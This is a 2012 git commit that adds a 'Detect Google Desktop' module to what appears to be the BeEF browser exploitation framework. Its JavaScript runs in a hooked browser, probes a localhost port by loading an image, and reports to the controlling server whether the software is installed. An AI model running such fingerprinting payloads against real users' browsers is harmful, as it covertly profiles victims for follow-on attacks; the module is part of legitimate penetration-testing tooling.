62bf8abd194730ed27e5d2ca8fcdf177e6aaea74
bcoles <bcoles@gmail.com>
2012-01-18 23:29:39 +1030

    Added Detect Google Desktop module

---
+++ modules/host/detect_google_desktop/command.js
@@ -0,0 +1,26 @@
+//
+//   Copyright 2012 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
+beef.execute(function() {
+
+	var dom = document.createElement('b');
+	var img = new Image;
+	img.src = "http://127.0.0.1:4664/logo3.gif";
+	img.onload = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Installed');dom.removeChild(this); }
+	img.onerror = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Not Installed');dom.removeChild(this); }
+	dom.appendChild(img);
+
+});
+
